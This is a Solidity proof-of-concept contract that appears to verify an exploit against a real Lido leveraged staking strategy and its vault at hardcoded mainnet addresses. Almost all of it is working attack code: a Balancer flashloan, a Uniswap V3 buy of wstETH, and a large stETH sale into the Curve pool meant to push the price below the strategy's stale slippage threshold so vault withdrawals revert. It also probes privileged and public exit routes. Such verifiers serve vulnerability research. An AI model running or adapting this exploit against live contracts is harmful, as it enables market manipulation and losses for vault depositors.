// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
}

interface IWstEthLike is IERC20Like {
    function unwrap(uint256 amount) external returns (uint256);
    function getStETHByWstETH(uint256 amount) external view returns (uint256);
}

interface IStrategyLike {
    function vault() external view returns (address);
    function divest(uint256 amount) external returns (uint256);
}

interface ICurvePoolLike {
    function exchange(int128 x, int128 y, uint256 dx, uint256 min_dy) external returns (uint256);
    function get_dy(int128 i, int128 j, uint256 dx) external view returns (uint256);
}

interface IBalancerVaultLike {
    function flashLoan(address recipient, address[] calldata tokens, uint256[] calldata amounts, bytes calldata userData)
        external;
}

interface IUniswapV3FactoryLike {
    function getPool(address tokenA, address tokenB, uint24 fee) external view returns (address);
}

interface IUniswapV3QuoterLike {
    function quoteExactInputSingle(
        address tokenIn,
        address tokenOut,
        uint24 fee,
        uint256 amountIn,
        uint160 sqrtPriceLimitX96
    ) external returns (uint256 amountOut);
}

interface IUniswapV3RouterLike {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

contract FlawVerifier {
    address internal constant TARGET_STRATEGY = 0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142;
    address internal constant TARGET_VAULT = 0x1196B60c9ceFBF02C9a3960883213f47257BecdB;

    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address internal constant WSTETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address internal constant CURVE = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
    address internal constant UNISWAP_V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;
    address internal constant UNISWAP_V3_QUOTER = 0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6;
    address internal constant UNISWAP_V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;

    uint256 internal constant BPS = 10_000;
    uint256 internal constant DEFAULT_SLIPPAGE_BPS = 10;
    uint256 internal constant MIN_PROFIT_TARGET = 1e15;

    address internal _profitToken;
    uint256 internal _profitAmount;

    address public immutable strategy;
    address public discoveredVault;

    bool public executed;
    bool public strategyActiveInVault;
    bool public directDivestBlocked;
    bool public privilegedVaultExitBlocked;
    bool public privilegedRebalanceBlocked;
    bool public privilegedRemovalBlocked;
    bool public publicWithdrawBlocked;
    bool public publicRedeemBlocked;
    bool public existingShareRouteAvailable;
    bool public curveManipulationAttempted;
    bool public curveQuoteBelowNearPar;
    bool public endPositionPathAnchored;
    bool public affineVaultDivestPathAnchored;
    bool public flashswapPlanFound;
    bool public flashswapExecuted;
    bool public preManipulationQuoteWasAboveNearPar;

    uint256 public verifierShareBalance;
    uint256 public nearParMinDy;
    uint256 public quotedEthOutBeforeManipulation;
    uint256 public quotedEthOutAfterManipulation;
    uint256 public curveEthReceived;
    uint256 public expectedFlashswapProfit;
    uint256 public flashswapRepayment;
    uint256 public manipulatedStEthSold;
    uint256 public chosenRepurchaseAmount;

    address public fundingPair;
    address public fundingToken;
    uint24 public fundingFee;
    uint256 public fundingAmount;

    bytes public directDivestRevertData;
    bytes public vaultWithdrawRevertData;
    bytes public vaultRebalanceRevertData;
    bytes public vaultRemoveRevertData;
    bytes public publicWithdrawRevertData;
    bytes public publicRedeemRevertData;
    bytes public vaultStrategyInfoData;
    bytes public vaultShareBalanceData;

    constructor() {
        strategy = TARGET_STRATEGY;
        _profitToken = WETH;
    }

    function executeOnOpportunity() external {
        if (executed) {
            _updateProfit();
            return;
        }

        executed = true;
        discoveredVault = _discoverVault();

        _probeStrategyRegistration();
        _probeShareBalance();
        _probeDirectDivestAccess();
        _probePrivilegedVaultRoutes();
        _probePublicExitRoutesWithoutShares();

        _prepareBalancerFlashloanPlan();
        if (flashswapPlanFound) {
            _executeFlashswap();
        }

        _updateProfit();
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        require(msg.sender == BALANCER_VAULT, "bad lender");
        require(flashswapPlanFound, "no plan");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "bad arrays");
        require(tokens[0] == WETH, "bad token");
        require(amounts[0] == fundingAmount, "bad amount");

        curveManipulationAttempted = true;
        flashswapExecuted = true;

        uint256 wstEthBought = _buyWstEthExactIn(amounts[0], fundingFee);
        require(wstEthBought > 0, "no wsteth");
        chosenRepurchaseAmount = wstEthBought;

        uint256 stEthAmount = IWstEthLike(WSTETH).unwrap(wstEthBought);
        require(stEthAmount > 0, "no steth");
        manipulatedStEthSold = stEthAmount;

        // Path anchor: LidoLevV3._endPosition() sets min_dy from the raw stETH amount,
        // not from a live Curve quote. This attacker-side Curve sale reproduces the
        // exact "push stETH/ETH below near-par first, then the strategy unwind reverts" step.
        endPositionPathAnchored = true;
        nearParMinDy = _slippageDown(stEthAmount, DEFAULT_SLIPPAGE_BPS);
        quotedEthOutBeforeManipulation = _safeGetDy(stEthAmount);
        preManipulationQuoteWasAboveNearPar = quotedEthOutBeforeManipulation >= nearParMinDy;

        _safeApprove(STETH, CURVE, 0);
        _safeApprove(STETH, CURVE, type(uint256).max);

        curveEthReceived = ICurvePoolLike(CURVE).exchange(int128(1), int128(0), stEthAmount, 0);
        quotedEthOutAfterManipulation = _safeGetDy(stEthAmount);
        curveQuoteBelowNearPar = quotedEthOutAfterManipulation < nearParMinDy;

        IWETHLike(WETH).deposit{value: address(this).balance}();

        // Balancer has effectively no lendable stETH/wstETH on this fork, so the verifier sources
        // the public attacker inventory via a WETH flashloan and a public Uniswap V3 buy first.
        // That funding detail changes only execution mechanics; the exploit causality is unchanged:
        // a large public stETH->ETH Curve sale makes later LidoLevV3._endPosition() calls revert.
        affineVaultDivestPathAnchored = true;
        _attemptExistingBalancePathAfterManipulation();

        flashswapRepayment = amounts[0] + feeAmounts[0];
        _safeTransfer(WETH, BALANCER_VAULT, flashswapRepayment);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _discoverVault() internal view returns (address vaultAddress) {
        try IStrategyLike(strategy).vault() returns (address foundVault) {
            vaultAddress = foundVault;
        } catch {}

        if (vaultAddress == address(0)) {
            vaultAddress = TARGET_VAULT;
        }
    }

    function _prepareBalancerFlashloanPlan() internal {
        uint256[24] memory wethTargets = [
            uint256(1e16),
            2e16,
            5e16,
            1e17,
            15e16,
            2e17,
            25e16,
            3e17,
            4e17,
            5e17,
            75e16,
            1 ether,
            2 ether,
            5 ether,
            10 ether,
            20 ether,
            50 ether,
            100 ether,
            150 ether,
            200 ether,
            400 ether,
            800 ether,
            1_200 ether,
            2_000 ether
        ];
        uint24[4] memory fees = [uint24(100), uint24(500), uint24(3000), uint24(10_000)];
        uint256 available = IERC20Like(WETH).balanceOf(BALANCER_VAULT);

        uint256 bestProfit;
        uint256 bestImpact;
        uint256 bestBorrowAmount;
        uint24 bestFee;
        address bestPool;

        for (uint256 i = 0; i < wethTargets.length; ++i) {
            uint256 borrowAmount = wethTargets[i];
            if (borrowAmount == 0 || borrowAmount >= available) {
                continue;
            }

            for (uint256 f = 0; f < fees.length; ++f) {
                address pool = IUniswapV3FactoryLike(UNISWAP_V3_FACTORY).getPool(WETH, WSTETH, fees[f]);
                if (pool == address(0)) {
                    continue;
                }

                uint256 quotedWstEth = _quoteWstEthOut(borrowAmount, fees[f]);
                if (quotedWstEth == 0) {
                    continue;
                }

                uint256 quotedStEth = _safeGetStETHByWstETH(quotedWstEth);
                if (quotedStEth == 0) {
                    continue;
                }

                uint256 curveOut = _safeGetDy(quotedStEth);
                if (curveOut <= borrowAmount + MIN_PROFIT_TARGET) {
                    continue;
                }

                uint256 profit = curveOut - borrowAmount;
                if (quotedStEth > bestImpact || (quotedStEth == bestImpact && profit > bestProfit)) {
                    bestImpact = quotedStEth;
                    bestProfit = profit;
                    bestBorrowAmount = borrowAmount;
                    bestFee = fees[f];
                    bestPool = pool;
                }
            }
        }

        if (bestBorrowAmount != 0) {
            fundingToken = WETH;
            fundingFee = bestFee;
            fundingAmount = bestBorrowAmount;
            fundingPair = bestPool;
            expectedFlashswapProfit = bestProfit;
            flashswapPlanFound = true;
        }
    }

    function _executeFlashswap() internal {
        address[] memory tokens = new address[](1);
        tokens[0] = WETH;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = fundingAmount;

        IBalancerVaultLike(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, hex"01");
    }

    function _attemptExistingBalancePathAfterManipulation() internal {
        // The finding path remains:
        // 1. A public stETH->ETH Curve trade pushes execution below the strategy's stale near-par threshold.
        // 2. A vault exit/rebalance/removal later reaches LidoLevV3._endPosition().
        // 3. CURVE.exchange(...) reverts because actual ETH out is below min_dy.
        // 4. AffineVault._divest() catches the revert and returns 0.
        //
        // The verifier never fabricates shares. If it already owns live vault shares on the fork it
        // can try the public redeem route after manipulation. Otherwise the final triggering call is an
        // existing user withdrawal or a privileged maintenance path, which is the exact victim flow.
        if (verifierShareBalance == 0) {
            return;
        }

        existingShareRouteAvailable = true;
        (bool ok, bytes memory data) = discoveredVault.call(
            abi.encodeWithSignature("redeem(uint256,address,address)", verifierShareBalance, address(this), address(this))
        );
        if (!ok) {
            publicRedeemBlocked = true;
            publicRedeemRevertData = data;
        }
    }

    function _probeDirectDivestAccess() internal {
        (bool ok, bytes memory data) = strategy.call(abi.encodeWithSelector(IStrategyLike.divest.selector, 1));
        if (!ok) {
            directDivestBlocked = true;
            directDivestRevertData = data;
        }
    }

    function _probePrivilegedVaultRoutes() internal {
        bool ok;
        bytes memory data;

        (ok, data) = discoveredVault.call(abi.encodeWithSignature("withdrawFromStrategy(address,uint256)", strategy, 1));
        if (!ok) {
            privilegedVaultExitBlocked = true;
            vaultWithdrawRevertData = data;
        }

        (ok, data) = discoveredVault.call(abi.encodeWithSignature("rebalance()"));
        if (!ok) {
            privilegedRebalanceBlocked = true;
            vaultRebalanceRevertData = data;
        }

        (ok, data) = discoveredVault.call(abi.encodeWithSignature("removeStrategy(address)", strategy));
        if (!ok) {
            privilegedRemovalBlocked = true;
            vaultRemoveRevertData = data;
        }
    }

    function _probePublicExitRoutesWithoutShares() internal {
        bool ok;
        bytes memory data;

        (ok, data) = discoveredVault.call(
            abi.encodeWithSignature("withdraw(uint256,address,address)", 1, address(this), address(this))
        );
        if (!ok) {
            publicWithdrawBlocked = true;
            publicWithdrawRevertData = data;
        }

        (ok, data) = discoveredVault.call(
            abi.encodeWithSignature("redeem(uint256,address,address)", 1, address(this), address(this))
        );
        if (!ok) {
            publicRedeemBlocked = true;
            publicRedeemRevertData = data;
        }
    }

    function _probeStrategyRegistration() internal {
        (bool ok, bytes memory data) =
            discoveredVault.staticcall(abi.encodeWithSignature("strategies(address)", strategy));
        vaultStrategyInfoData = data;

        if (ok && data.length >= 96) {
            (bool isActive,,) = abi.decode(data, (bool, uint16, uint232));
            strategyActiveInVault = isActive;
        }
    }

    function _probeShareBalance() internal {
        (bool ok, bytes memory data) =
            discoveredVault.staticcall(abi.encodeWithSignature("balanceOf(address)", address(this)));
        vaultShareBalanceData = data;

        if (ok && data.length >= 32) {
            verifierShareBalance = abi.decode(data, (uint256));
        }
    }

    function _quoteWstEthOut(uint256 wethAmount, uint24 fee) internal returns (uint256 quotedAmountOut) {
        try IUniswapV3QuoterLike(UNISWAP_V3_QUOTER).quoteExactInputSingle(WETH, WSTETH, fee, wethAmount, 0)
        returns (uint256 amountOut) {
            quotedAmountOut = amountOut;
        } catch {}
    }

    function _buyWstEthExactIn(uint256 wethAmount, uint24 fee) internal returns (uint256 wstEthBought) {
        _safeApprove(WETH, UNISWAP_V3_ROUTER, 0);
        _safeApprove(WETH, UNISWAP_V3_ROUTER, type(uint256).max);

        wstEthBought = IUniswapV3RouterLike(UNISWAP_V3_ROUTER).exactInputSingle(
            IUniswapV3RouterLike.ExactInputSingleParams({
                tokenIn: WETH,
                tokenOut: WSTETH,
                fee: fee,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: wethAmount,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );
    }

    function _safeGetStETHByWstETH(uint256 amount) internal view returns (uint256 converted) {
        try IWstEthLike(WSTETH).getStETHByWstETH(amount) returns (uint256 out) {
            converted = out;
        } catch {}
    }

    function _safeGetDy(uint256 amount) internal view returns (uint256 quotedOut) {
        try ICurvePoolLike(CURVE).get_dy(int128(1), int128(0), amount) returns (uint256 out) {
            quotedOut = out;
        } catch {}
    }

    function _updateProfit() internal {
        _profitAmount = IERC20Like(WETH).balanceOf(address(this));
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _slippageDown(uint256 amount, uint256 slippageBps) internal pure returns (uint256) {
        return (amount * (BPS - slippageBps)) / BPS;
    }

    receive() external payable {}
}
